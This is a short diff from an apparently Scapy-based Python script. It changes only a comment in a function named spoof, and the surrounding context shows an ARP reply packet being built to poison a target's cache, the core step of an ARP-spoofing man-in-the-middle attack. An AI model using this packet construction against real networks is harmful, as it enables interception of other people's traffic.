@@ -15,7 +15,7 @@ def get_mac(ip):
 
 
 def spoof(target_ip, spoof_ip, target_mac):
-    # tell target_ip that spoof_ip is at our MAC (attacker MAC)
+    # tell target_ip that spoof_ip is at our MAC
     pkt = Ether(dst=target_mac) / ARP(
         op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip
     )
